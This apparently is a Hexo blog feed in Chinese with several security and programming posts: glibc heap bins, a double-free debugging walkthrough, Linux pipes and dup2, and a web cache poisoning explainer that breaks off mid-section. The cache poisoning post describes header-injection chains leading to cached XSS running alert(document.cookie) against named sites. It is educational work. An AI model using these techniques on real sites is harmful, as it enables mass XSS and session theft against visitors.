alt="unsortedbins"></p><p>这里还要注意的一个地方就是，unsortedbins占据bin数组的下标为1处，即0x7ffff7dcfcb0-0x7ffff7dcfcc0</p><p>small bins占据62个，largebins占据63个</p><p>可以从上图以及malloc_state分布状况中看出，unsortedbins头节点已经标示了第一个待分配堆块的地址0x0000555555756870，同时标示了最后一个待分配堆块的地址0x0000555555756250</p><p>综上可以看出，每一条bins链的头节点结构与普通的堆块节点结构是不相同的，这里有一个解释( <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/#chunk">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/#chunk</a> ),但我私以为其中的解释有些许绕，并且也不是prev_size和size重用的问题</p><p>实际上头节点的构造与普通堆块的构造本来就不相同，普通堆块的prev_size以及size这两个区域在头节点这里本身就没有实现。</p><p>所以如果要操作头节点，务必不能误以为其结构与普通堆节点相同，从而去操作其prev_size以及size的值，因为从内存分布的角度来看，头节点的prev_size和size实际上是top chunk以及last remainder的内存位置(unsortedbins)，或者就是前一条bin链的头节点结构(small、largebins)，<br>随意操作将会导致malloc_state结构错乱，发生不可预期的错误</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>learn pwn,and be well</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Double free</title>
      <link href="Double-free.html"/>
      <url>Double-free.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>仅记录自己调试程序的一个double free漏洞的问题</p><h1 id="Tcachebins"><a href="#Tcachebins" class="headerlink" title="Tcachebins"></a>Tcachebins</h1><p>对于稍微了解linux堆内存管理的人来说，fastbins这个词一定不陌生，而在libc2.26之后，一个新的机制 <strong>Tcachebins</strong>被引入了，Tcachebins和fastbins很像，但优先级在fastbins之前。</p><p>被free的适当大小的内存块会优先被放入Tcachebins，且Tcachebins的每一个链上可以最多链接7个堆块，只有当Tcachebins满了之后，再free的内存块才会被放入fastbins及unsorted bins</p><p>在malloc时，也会优先取Tcachebins中的内存块</p><p>Tcachebins和fastbins一样，仅基于fd指针构造单链表，且遵循LIFO的原则</p><h1 id="ptmalloc堆结构"><a href="#ptmalloc堆结构" class="headerlink" title="ptmalloc堆结构"></a>ptmalloc堆结构</h1><p>如下图所示：</p><p><img src="/image/doubleFree/heap.jpg" alt="heap"></p><p>在图中，prev_size以及size构成了chunk头：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.prev_size    只有在前一个堆块是空闲时才会有值，用来指示前一个堆块的大小</span><br><span class="line">2.size         当前chunk的大小（包括chunk header的长度）。由于chunk大小是8的整数倍，所以此size的后3 bit被用于存储其他信息</span><br></pre></td></tr></table></figure><p>prev_size与size分别占据8字节的长度，即chunk头为0x10长.</p><p>prev_size所占据的8个字节在prev chunk处在in-use的情况下是无用的，可以被prev chunk使用</p><p>size的后三bit有特殊用途，被用于存储其他信息,如下图所示：</p><p><img src="/image/doubleFree/chunkheader.jpg" alt="chunkheader"></p><p>这三位的作用是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.NON_MAIN_ARENA     这个堆块是否位于主线程</span><br><span class="line">2.IS_MAPPED          记录当前 chunk 是否是由 mmap 分配的</span><br><span class="line">3.PREV_INUSE         记录前一个 chunk 块是否被分配</span><br></pre></td></tr></table></figure><p>如果当前chunk处于未被使用状态，则mem前8 bytes被用来存储其他信息，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd:     下一个未被使用的chunk的地址</span><br><span class="line">bk:     上一个未被使用的chunk的地址</span><br></pre></td></tr></table></figure><p>一般我们使用void *x = malloc(1)，获得的指针地址指向的是fd的开头，chunk header为ptmalloc自动分配</p><p>另外，在malloc时，根据操作系统的位数，有一个最小分配空间的概念，在64位上=16字节，32位=8字节，即哪怕malloc(0)，也会按照最小值分配</p><h1 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h1><h2 id="下断点至第一次free"><a href="#下断点至第一次free" class="headerlink" title="下断点至第一次free"></a>下断点至第一次free</h2><p><img src="/image/doubleFree/firstfree.jpg" alt="firstfree"></p><p>此时，tcache如下图所示</p><p><img src="/image/doubleFree/firstfree-tcache.jpg" alt="firstfree-tcache"></p><p>moduleNameBuff指向的地址内容如下所示：</p><p><img src="/image/doubleFree/firstfree-mnb.jpg" alt="firstfree-mnb"></p><h2 id="第一次free后"><a href="#第一次free后" class="headerlink" title="第一次free后"></a>第一次free后</h2><p><img src="/image/doubleFree/afterfirstfree-code.jpg" alt="afterfirstfree-code"></p><p>tacache如下所示：</p><p><img src="/image/doubleFree/afterfirstfree-tcache.jpg" alt="afterfirstfree-tcache"></p><p>原moduleNameBuff所指向的地址(0x55555575ecd0)，这里-0x10是为了指向chunk头</p><p><img src="/image/doubleFree/afterfirstfree-mnb.jpg" alt="afterfirstfree-mnb"></p><p>可以看到对应上面提到的堆结构，fd指针已经指向了tcachebins中的下一块未被使用的堆地址(0x000055555575ed70)</p><h2 id="下断点并运行至第二次free"><a href="#下断点并运行至第二次free" class="headerlink" title="下断点并运行至第二次free"></a>下断点并运行至第二次free</h2><p><img src="/image/doubleFree/secondfree-code.jpg" alt="secondfree-tcache"></p><p>此时tcache如下图所示：</p><p><img src="/image/doubleFree/secondfree-tcache.jpg" alt="secondfree-tcache"></p><p>地址0x55555575ecd0-0x10如下所示：</p><p><img src="/image/doubleFree/secondfree-mnb.jpg" alt="secondfree-mnb"></p><p>此时可以看到，由于4-5步之间我还进行了其他的操作，所以导致tcache链上增加了其他的几个空闲块，且此时将要被double free的内存块并未有异常</p><h2 id="第二次free后"><a href="#第二次free后" class="headerlink" title="第二次free后"></a>第二次free后</h2><p><img src="/image/doubleFree/aftersecondfree-code.jpg" alt="aftersecondfree-code"></p><p>此时tcache如下所示：</p><p><img src="/image/doubleFree/aftersecondfree-tcache.jpg" alt="aftersecondfree-tcache"></p><p>此时地址0x55555575ecd0-0x10如下所示：</p><p><img src="/image/doubleFree/aftersecondfree-mnb.jpg" alt="aftersecondfree-mnb"></p><p>可以看到，tcache显示loop detected，并且被double free的0x55555575ecd0这一堆块的fd指针指向了0x000055555575edd0，即tcache中显示的下一个空闲堆块</p><p>而0x000055555575edd0所指向的堆块如下所示：</p><p><img src="/image/doubleFree/aftersecondfree-another.jpg" alt="aftersecondfree-another"></p><p>可以看到此时0x000055555575edd0所指向的堆块中fd为0x55555575ecd0，那么这也就可以解释loop出现的原因，0x55555575ecd0与0x000055555575edd0中的fd互相指向，形成了一个循环，这是不应当的</p><h2 id="跳至“第一块”0x55555575ecd0被分配"><a href="#跳至“第一块”0x55555575ecd0被分配" class="headerlink" title="跳至“第一块”0x55555575ecd0被分配"></a>跳至“第一块”0x55555575ecd0被分配</h2><p>此时double free的问题还没有显现出来</p><p><img src="/image/doubleFree/first-ecd-code.jpg" alt="first-ecd-code"></p><p>此时tcache如下所示：</p><p><img src="/image/doubleFree/firstalloc-ecd-tcache.jpg" alt="firstalloc-ecd-tcache"></p><p>0x000055555575edd0和0x55555575ecd0堆块如下所示：</p><p><img src="/image/doubleFree/firstalloc-ecd-twoheap.jpg" alt="firstalloc-ecd-twoheap"></p><p>可以看到，断点下到了即将执行malloc的代码处，申请的堆空间为4字节，加上头长为0x14，故而分配0x20size的堆块，此时tcache显示下一个即将被分配的0x20size的堆块为被我们double free的”第一块”0x55555575ecd0</p><h2 id="准备填入数据"><a href="#准备填入数据" class="headerlink" title="准备填入数据"></a>准备填入数据</h2><p>当“第一块”0x55555575ecd0被分配给data_len后，我准备向这个堆块中填入数据</p><p><img src="/image/doubleFree/rec-data-first-ecd-code.jpg" alt="rec-data-first-ecd-code"></p><p> 此时0x000055555575edd0和0x55555575ecd0堆块如下所示：</p><p><img src="/image/doubleFree/rec-data-first-twoheap.jpg" alt="rec-data-first-twoheap"></p><p>tcache如下所示：</p><p><img src="/image/doubleFree/rec-data-first-tcache.jpg" alt="rec-data-first-tcache"></p><p>可以看到，我准备向0x55555575ecd0指向的堆块中写入四个字节的数据，而且此时0x000055555575edd0和0x55555575ecd0堆块以及tcache并没有变动</p><h2 id="填入数据"><a href="#填入数据" class="headerlink" title="填入数据"></a>填入数据</h2><p><img src="/image/doubleFree/rec-data-first-done-code.jpg" alt="rec-data-first-done-code"></p><p>此时tcache：</p><p><img src="/image/doubleFree/rec-data-first-done-tcache.jpg" alt="rec-data-first-done-tcache"></p><p>此时0x000055555575edd0和0x55555575ecd0堆块：</p><p><img src="/image/doubleFree/rec-data-first-done-twoheap.jpg" alt="rec-data-first-done-twoheap"></p><p>可以看到，我向0x55555575ecd0指向的堆块中的低四字节写入了0x00000001,而此时由于0x55555575ecd0被tcache误认为仍是空闲堆块(还存在在tcache的链上)，故而在tcache看来，0x55555575ecd0所指向的堆块的头八个字节应当是fd，即指向下一个空闲堆块，故而误将我写入后的四字节+原本的四字节当作了下一个空闲堆块的地址，即0x0000555510000000，而这个地址是无法访问的，从tcache也可以看出，其误将0x0000555510000000作为了“第二个”0x55555575ecd0后的空闲堆块，由于无法访问这一个地址，故而显示<code>[Corrupted chunk at 0x555510000000]</code></p><p>实际上我这里还有一个错误，就是在data_len使用完后并没有立即释放，故而0x55555575ecd0所指向的堆块在之后的程序中会一直呈现被占用的状态，不会再有指针去修改其中的数据，这也代表着Corrupted chunk像一个定时炸弹一样，等待其被分配的那一刻</p><p>不过就算我立即free了data_len，随后仍有可能会有其他的指针获得0x55555575ecd0指向的堆块并修改其中的数据，将0x0000555510000000改为其他的值，继续维持异常的状态，导致同样的崩溃</p><h2 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h2><p>跳至等到所有排在Corrupted chunk之前的堆块都被分配后</p><p><img src="/image/doubleFree/boooom-code.jpg" alt="boooom-code"></p><p>此时tcache：</p><p><img src="/image/doubleFree/boooom-tcache.jpg" alt="boooom-tcache"></p><p>此时0x000055555575edd0和0x55555575ecd0堆块：</p><p><img src="/image/doubleFree/boooom-twoheap.jpg" alt="boooom-twoheap"></p><p>可以看见即将要执行malloc(4)的操作，对应0x20size的堆块，而在tcache中显示下一块即将被分配的0x20size的堆块为<code>Corrupted chunk</code>，故而在此句程序结束后，程序崩溃，并抛出了错误<code>Program received signal SIGSEGV, Segmentation fault.</code></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>实际上，这样的漏洞进一步可以导致<code>write-anything-anywhere</code>问题，而且当写入的内容可以由外部决定时(例如从socket上获取数据)尤为严重，配合其他的漏洞就有可能形成攻击链。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux中的pipe与fd</title>
      <link href="linux-fd.html"/>
      <url>linux-fd.html</url>
      
        <content type="html"><![CDATA[<h1 id="Pipe"><a href="#Pipe" class="headerlink" title="Pipe"></a>Pipe</h1><p>我们经常能看到如下的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int pipefd[2];</span><br><span class="line">int status &#x3D; pipe(pipefd);</span><br><span class="line">if(status&#x3D;&#x3D;-1)&#123;</span><br><span class="line">  printf(&quot;create pipe erro\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">...fork()....</span><br><span class="line">&#x2F;&#x2F;child</span><br><span class="line">dup2(pipefd[0], STDIN_FILENO);</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>(这边省略了父子进程close无用fd的代码，要close这些无用fd，参看下面的讲解)</p><p>上面这段代码首先定义了一对pipe的fd，初始化这对pipe，并在fork后的子进程中将子进程的标准输入重定向至pipefd[1]</p><p>在理解上面的含义之前，其实我应当声明一些重要的概念，首先是在声明初始化一对pipe时，默认pipefd[1]是数据流入端，而pipefd[0]是数据流出端，并且，pipe是单向的，永远从pipefd[1] –&gt; pipefd[0]</p><p>另外，以下这部分代码经常引起疑惑(大概)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dup2(pipefd[0], STDIN_FILENO);</span><br></pre></td></tr></table></figure><p>因为上面说过，pipefd[0]是数据流出端，那为啥<strong>标准输入</strong>会与pipefd[0]打上交道呢？一个<strong>输入</strong>，一个<strong>流出</strong>，感觉貌似弄反了。</p><p>但实际上，并不是如此，因为如果你细细看过dup2的实现你会发现，dup2函数的原型是int dup2(int fd,int fd2)，其实现的功能就是：对于fd2，可以用fd参数指定fd2的值。如果fd2已经打开，则先将其关闭。如若fd等于fd2，则dup2返回fd2，而不关闭它。否则，fd2的FD_CLOEXEC文件描述符标志就被清楚，这样fd2在进程调用exec时是打开状态。</p><p>那这里面实际上最重要的，就是这个<strong>关闭</strong>是啥意思</p><p>实际上，我们可以把fd看成一个连线图的感觉，举例来说，原先STDIN_FILENO指向的是键盘，也就是我们所谓的标准输出，但是，如果经过上面的代码，那么STDIN_FILENO将会取消指向键盘，转而指向pipefd[0]所指向的管道的0端，所以此时只要是管道的0端<strong>流出的任何东西</strong>都将会成为STDIN_FILENO所<strong>接受的输入</strong></p><p>看到这儿，基本能解释“弄反”的疑惑了，反之同理，如下的代码将表示STDOUT_FILENO以及STDERR_FILENO所<strong>输出的任何东西</strong>将变为管道的1端(pipefd[1]指向的就是管道的1端)所<strong>流入的任何东西</strong></p><p>(管道的0端和1端可以看下面的抽象图形)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dup2(pipefd[1],STDOUT_FILENO);</span><br><span class="line">dup2(pipefd[1],STDERR_FILENO);</span><br></pre></td></tr></table></figure><p>那管道呢，实际上我们可以将其抽象为这样一个图形：</p><p>pipe :           pipefd[1]–指向–&gt;1———数据流转———&gt;0&lt;–指向–pipefd[0]</p><p>而所谓的dup2(pipefd[0], STDIN_FILENO)，也就是这样：</p><p>更改后：        pipefd[1]–指向–&gt;1———数据流转———&gt;0&lt;–指向–(pipefd[0],STDIN_FILENO)  </p><p>(注意:这里写在一起只是因为不方便画图，实际上pipefd[0]，STDIN_FILENO是<strong>分别</strong>指向管道的0端，并不是STDIN_FILENO先指向pipefd[0]，pipefd[0]再指向管道的0端，这很关键！是分叉而不是直线!)</p><p>而一般我们在子进程中调用完<code>dup2(pipefd[0], STDIN_FILENO);</code>后会调用<code>close(pipefd[0])</code>，让pipefd[0]不再指向0，从而将管道变为这样：</p><p>pipe :           pipefd[1]–指向–&gt;1———数据流转———&gt;0&lt;–指向–STDIN_FILENO</p><p>这时，父进程只需要向pipefd[1]中写入数据，就会通过管道，写入至子进程的STDIN_FILENO中了</p><p>但是这里要注意了，务必要在调用完<code>dup2(pipefd[0], STDIN_FILENO);</code>之后再调用<code>close(pipefd[0])</code>，切不可倒过来，因为一旦倒过来，先取消了pipefd[0]与管道0端的绑定，那么STDIN_FILENO将无法与管道0端进行绑定!(其实就有点pipefd[0]把自己的绑定信息“拷贝”给STDIN_FILENO的感觉，如果自己绑定信息被清空，那么自然也就无法“拷贝”给STDIN_FILENO了，意思是这么个意思，不想深究其原理的话大致可以粗浅的这么认为)</p><p>另外还有一点需要提一下，那就是如果在fork之前执行了dup2函数，那么fork后的子进程依然会继承父进程dup2函数所带来的影响，换句话说，就是继承相同的fd表。那么如果上面的dup2语句放在了fork前执行，那么管道会变成这样：</p><p>pipe :           pipefd[1]–指向–&gt;1———数据流转———&gt;0&lt;–指向–(父-STDIN_FILENO,子-STDIN_FILENO）</p><p>那么此时可以发现，有两个标准输入都指向了同一条管道的0端，那么为了防止由1端输入的数据被错误进程的标准输入读走，我们必须在读出数据前取消其中一个STDIN_FILENO与此管道的绑定</p><p>如果说我们希望子进程来读，那么在fork之后，父进程必须记得执行close(0),取消自己的标准输入与管道的绑定，让管道变成如下这样：</p><p>pipe :           pipefd[1]–指向–&gt;1———数据流转———&gt;0&lt;–指向–子-STDIN_FILENO</p><p>这样的话，父进程向pipefd[1]中写入数据，就能保证一定会被子进程的标准输入所捕获了，所以由此可得，我们在使用一条管道时，<strong>务必保证指向管道1端以及指向管道0端的fd分别有且仅有一个</strong>，不然程序可能会出现预期之外的行为</p><p>最后，因为管道是单向的，所以如果我们还希望将子进程的输出由父进程捕获，那么我们就还需要另一条管道，用来使子进程向父进程传输数据</p><p>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int pipefd[2];</span><br><span class="line">int pipefd2[2];</span><br><span class="line">int status &#x3D; pipe(pipefd);</span><br><span class="line">if(status&#x3D;&#x3D;-1)&#123;</span><br><span class="line">  printf(&quot;create pipe erro\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int status2 &#x3D; pipe(pipefd2);</span><br><span class="line">if(status2&#x3D;&#x3D;-1)&#123;</span><br><span class="line">  printf(&quot;create pipe erro\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">...fork()....</span><br><span class="line">&#x2F;&#x2F;child</span><br><span class="line">dup2(pipefd[0], STDIN_FILENO);</span><br><span class="line">dup2(pipefd2[1],STDOUT_FILENO);</span><br><span class="line">dup2(pipefd2[1],STDERR_FILENO);</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>(这边省略了父子进程close无用fd的代码，要close这些无用fd，参看上面的讲解，是一个意思)</p><p>这样，子进程的输出将会自动写入pipefd2[1]，父进程只需要根据需要，读出pipefd2[0]的数据即可实现子—-&gt;父的通讯过程</p><p>另外，还有个小tip，就是有时候我们会无限循环地读管道地数据流出端(即0端)，那么我们该如何退出这个死循环，就像go中close channel一样，让读出端能够感知管道已经被废弃，从而结束”读“任务呢？</p><p>要完成以上的目标，我们所需要做的，就是将1端，即数据输入端的引用计数变为0，也即相当于我们上面所提到的，取消所有fd与管道数据输入端的绑定，当输入端的引用计数变为0时，读取者将会读到0，此时通过判断数据长度是否为0就可以退出循环</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其实管道的内部实现是很复杂的，linux的管道机制要深究起来能写一本书。。。以后有空还是要多研究总结，不然老是记混 👻</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB缓存投毒攻击技术</title>
      <link href="Web-Cache-Poisoning.html"/>
      <url>Web-Cache-Poisoning.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>老规矩,还是要简单介绍一下这个技术，实际上这个技术和我之前总结的HTTP Smuggling一样，属于比较”冷门”的漏洞，在大家热衷于寻找RCE、XSS、Sql injection的今天，此漏洞看似“垂垂老矣”，其复杂的攻击方式及“理论上的”威胁实在难以得到安全研究人员的青睐</p><p>但是实际上，还是老话，没有无用的，只有你不会的～</p><p>简单说，Web Cache Posioning旨在欺骗网站缓存，尝试劫持缓存服务器，使其缓存错误的资源，从而导致其后一系列如：DOS，XSS等等的攻击</p><p>那我们就来详细聊一聊这个“孤独”的攻击手法吧</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>由于Web Cache Posioning这种攻击手段与缓存有着很大的关联，所以首先，需要先熟悉一下缓存的基本原理</p><p>下图可以简单了解缓存的原理:</p><p><img src="/image/Web-Cache-Poisoning/cache.jpg" alt="cache"></p><p>简单来说，就是当一个用户访问了例如/static/test.png这一资源后，Cache服务将会缓存(如果是可缓存的话)这一资源，当之后再有用户访问相同的资源时，Cache服务将不会转发此请求至后端服务器，而是直接将其保存的对应的数据返回。</p><p>听起来是不是很简单？这也是我们经常使用的CDN的最为基本的原理</p><p>但是，作为一个安全人员，在上面这句话中，总也能嗅到一丝危险的味道，“不会转发”、“直接返回”这样的字眼往往蕴含着巨大的风险</p><p>而Web Cache Posioning就是基于这些字眼而发起的攻击，我们的目标就是欺骗前端的缓存服务器，让其误认为受害者与攻击者访问的是同一个资源，从而在不请示后端服务器的情况下，误把被攻击者污染后的资源文件提供给受害者。</p><p><img src="/image/Web-Cache-Poisoning/cache-posioning.jpg" alt="cache-posioning"></p><p>对于缓存服务器，如果其判断是否是<strong>同一个资源</strong>的规则是基于url以及host头时，那么缓存服务器将简单地认为下两个请求是等同的</p><p><img src="/image/Web-Cache-Poisoning/first-request.jpg" alt="first-request"></p><p><img src="/image/Web-Cache-Poisoning/second-request.jpg" alt="second-request"></p><p>可以看到，橙色字体将是缓存服务器判断的根据，所以缓存服务器将会把第一个请求的响应拿来作为第二个请求的响应</p><p>但是我们可以看到，蓝色字体部分，两个请求所请求的文本语言是不一样的，故而这样的话，缓存服务器就“错误”地为第二个用户提供了错误语言版本的响应</p><p>在某种程度上，这就是最简单的(也是不太可能出现的)“欺骗”</p><p>但，事情从此才开始有趣了起来(笑)</p><h1 id="手法"><a href="#手法" class="headerlink" title="手法"></a>手法</h1><p>那么问题来了，我们应当如何有效的“欺骗”缓存服务器呢？</p><p>首先，我之前所讨论的HTTP Smuggling技术，其实就是可以完成这一操作的，如果想不明白，可以回过头看看那篇文章</p><p>当然了，我不会重复讨论同样的手法，所以这里要讲的，是另一种，更为有效，也更为直接的手法，即利用HTTP包头的解释歧义来进行缓存毒化</p><p>详细看看吧</p><h2 id="基础入门"><a href="#基础入门" class="headerlink" title="基础入门"></a>基础入门</h2><p>这里将会举一个redhat.com的真实例子</p><p>在redhat.com的一个页面上，我们发现了一个特殊的标头，如下图所示：</p><p><img src="/image/Web-Cache-Poisoning/redhat-before.jpg" alt="redhat-before"></p><p>可以看见如果我们在请求中带入X-Forwarded-Host标头，那么此标头的值将被用来在meta标签里生成url，那么如果试试xss呢？</p><p><img src="/image/Web-Cache-Poisoning/redhat-after.jpg" alt="redhat-after"></p><p>可以发现，并未做任何过滤，我们的X-Forwarded-Host的值直接被带入了meta标签，造成了XSS</p><p>那么，这个界面是否会被CDN缓存呢？</p><p>这时我们打开无痕浏览，模拟受害者，再次访问这个页面</p><p><img src="/image/Web-Cache-Poisoning/redhat-result.jpg" alt="redhat-result"></p><p>可以看见，我们成功的让CDN缓存了这个界面，所有访问这一页面的用户将会在不知情的情况下遭受XSS攻击</p><h2 id="变得更为谨慎"><a href="#变得更为谨慎" class="headerlink" title="变得更为谨慎"></a>变得更为谨慎</h2><p>上面我们成功的毒化了<a href="https://www.redhat.com/en?dontpoisoneveryone=1">https://www.redhat.com/en?dontpoisoneveryone=1</a>, 但是，当我们想要毒化类似<a href="https://www.redhat.com/en">https://www.redhat.com/en</a> 这样的链接时，我们将会遇到很多困难，最主要就是由于这种链接的访问流量将会很大，攻击者很难保证自己的请求能在缓存过期时精确的成为第一个到达的请求，而光靠暴力的方式往往会消耗大量的资源却无法得到预期的结果</p><p>所以，我们需要抓住一切我们可以利用的细节，尝试缩小我们尝试毒化的时间窗口</p><p>就像在unity3d.com中，我们可以发现如下的场景</p><p><img src="/image/Web-Cache-Poisoning/unity3d.jpg" alt="unity3d"></p><p>从图中可以看到，可以使用X-Host标头向网页中注入数据</p><p>另外，可以看见在响应中包含有Age和Cache-Control标头，其中Age标头代表此缓存已经被记录了多少秒，而Cache-control标头表示了过期时间，这里是1800秒</p><p>基于以上的信息，攻击者就可以大大缩小尝试攻击的时间窗口，降低时间成本</p><p>当然了，很多时候大部分网站并没有unity3d这么“友善”，这也是此类攻击技术难以大规模应用的一个原因</p><h2 id="精准投放"><a href="#精准投放" class="headerlink" title="精准投放"></a>精准投放</h2><p>当缓存服务器将UA作为缓存键的一部分时，我们就可以实现对某一类用户的精准毒化</p><p><img src="/image/Web-Cache-Poisoning/vary.jpg" alt="vary"></p><p>从图中可以看到，服务器的响应中包含了vary头，vary头代表了服务器将会以何键作为判断的标准，在这里，UA以及AE头即是判断的标准</p><p>所以，我们便可以对某类UA头进行毒化，实现精准投放</p><h2 id="DOM毒化"><a href="#DOM毒化" class="headerlink" title="DOM毒化"></a>DOM毒化</h2><p>当然了，也不是所有的毒化都像第一个例子一样那么轻松惬意地植入XSS的payload，又或者说，缓存服务器会有一些“额外”的特殊行动</p><p>就比如如下这种</p><p><img src="/image/Web-Cache-Poisoning/dom1.jpg" alt="dom1"></p><p>可以看到我们可以利用X-Forwarded-Host头注入一个自定义的域名</p><p>然后我们发现，此页面调用了data.host用来加载一个外部json</p><p><img src="/image/Web-Cache-Poisoning/dom2.jpg" alt="dom2"></p><p>json包含的内容如下所示</p><p><img src="/image/Web-Cache-Poisoning/dom3.jpg" alt="dom3"></p><p>可以看见json内容包含了网页翻译文本，那也就是说，我们可以控制网页翻译的文本，利用缓存毒化感染使用特定语言的用户</p><p>但我们在json返回的文本中可以看见，由于默认的语言是英语，故而英语不提供翻译文本，也就是说我们无法毒化使用英语的用户</p><p>所以我们需要找一个办法来强制使用英语的用户转变语言至我们控制的语言(这里使用es)</p><p>尝试更换语言至es，观察到浏览器发出了GET /setlang/es请求，响应如下</p><p><img src="/image/Web-Cache-Poisoning/dom4.jpg" alt="dom4"></p><p>可以发现，首先这个302是可以被缓存的，并且跳转后的页面路径是/?localized=1，那么就要考虑如何使得使用英语的用户在访问主页的时候“被迫”更换语言</p><p>通过对GET / 请求的分析，发现了我们可以使用X-Original-URL来重新指定访问的路径</p><p><img src="/image/Web-Cache-Poisoning/dom5.jpg" alt="dom5"></p><p>但是我们可以发现，这个请求无法被缓存，这样就无法将其传递给其他的用户</p><p>通过尝试，发现如果将X-Original-URL: /setlang/es转为X-Original-URL: /setlang\es，服务器将在302请求中将\转为正确的/，并且这样的请求将可以被服务器缓存</p><p><img src="/image/Web-Cache-Poisoning/dom6.jpg" alt="dom6"></p><p>那么现在，利用链已经完整了，首先毒化 <strong>/?localized=1</strong>，使其访问我们所制造的恶意的json文件，并且在 <strong>/?localized=1</strong>被毒化的时间内，毒化 <strong>/</strong> 页面，强制任何访问此页面的用户强制跳转至使用特定语言的 <strong>/?localized=1</strong> 页面，并执行我们所植入的恶意XSS payload。</p><p>成功图如下</p><p><img src="/image/Web-Cache-Poisoning/dom7.jpg" alt="dom7"></p><p>成功地执行了alert(document.cookie) 的payload</p><h2 id="路由中毒"><a href="#路由中毒" class="headerlink" title="路由中毒"></a>路由中毒</h2><p>除了以上的案列，有些服务器还会有不少令人匪夷所思的操作</p><p>比如下面这个，其会被恶意的http头欺骗，并使用此恶意的http标头来请求内部的路由</p><p><img src="/image/Web-Cache-Poisoning/route1.jpg" alt="route1"></p><p>可以看见X-Forwarded-Server标头将会有比Host标头更高的优先级，这欺骗了服务器，让其请求了非预期的资源。但是返回的响应由HTML编码，无法直接XSS</p><p>所以如果要利用这个漏洞，我们需要在HubSpot上托管一个自己的界面，并放入恶意的payload</p><p><img src="/image/Web-Cache-Poisoning/route2.jpg" alt="route2"></p><p>此类问题在SaaS程序上极为常见，因为他们往往会由一个系统来处理去往不同服务的请求</p><h2 id="标头“合作”"><a href="#标头“合作”" class="headerlink" title="标头“合作”"></a>标头“合作”</h2><p>有时候，往往一个欺骗性的标头并不一定能够展现出效果，这时候，就要尝试使用多个标头“合作”欺骗</p><p>来看看下面的实例</p><p><img src="/image/Web-Cache-Poisoning/more1.jpg" alt="more1"></p><p>可以看到X-Forwarded-Host头覆盖了cookie上的domain信息，但是这貌似不会带来任何的脆弱问题，仅仅只是修改了cookie的一个无关紧要的参数并不会带来任何的安全风险</p><p>这时候，试着尝试更多的标头，最终找到了另一个非预期的标头X-Forwarded-Scheme</p><p><img src="/image/Web-Cache-Poisoning/more2.jpg" alt="more2"></p><p>看起来貌似也没啥用，仍然没有任何的威胁</p><p>但是，但我们把两者结合起来，就会发生奇妙的化学反应，产生如下的结果</p><p><img src="/image/Web-Cache-Poisoning/more3.jpg" alt="more3"></p><p>从而我们就获得了劫持任意请求至任意域的能力</p><h2 id="劫持Open-Graph"><a href="#劫持Open-Graph" class="headerlink" title="劫持Open Graph"></a>劫持Open Graph</h2><p>Open Graph是由fb创建的协议，我们在分享一个链接的时候，只要分享的网站支持OG，那么就可以提供更详尽的视图，增强分享的效果</p><p>在下面的这个站点上，我们使用欺骗性的标头将会影响到OG的url</p><p><img src="/image/Web-Cache-Poisoning/og1.jpg" alt="og1"></p><p>可以看到我们影响到了OG的url部分，但是仔细查看响应可以发现，Cache-Control标头的值为private，并且在多次尝试后也证实了服务器拒绝缓存此响应</p><p>但是在其他的页面上，却仍然使用了缓存</p><p><img src="/image/Web-Cache-Poisoning/og2.jpg" alt="og2"></p><p>在这里需要注意，如果按照这样的请求，你会发现这个缓存将无法被有效的缓存，详情可以查看 <a 